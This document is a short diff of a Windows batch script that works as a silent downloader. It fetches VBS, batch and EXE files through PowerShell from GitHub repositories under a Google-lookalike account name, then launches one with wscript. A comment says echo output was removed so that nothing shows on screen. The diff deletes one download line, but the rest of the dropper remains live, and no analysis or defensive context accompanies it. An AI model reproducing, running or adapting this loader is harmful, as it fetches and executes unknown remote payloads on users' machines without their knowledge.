@@ -30,7 +30,6 @@ set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType
 :: ============================================================
 :: All 'echo' commands removed so no text is generated
 
-powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Task.vbs', 'Task.vbs')"
 powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
 powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
 powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
@@ -44,6 +43,7 @@ powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/ref
 if exist "launcher.vbs" (
     start "" "wscript.exe" "launcher.vbs"
 )
+
 
 
 
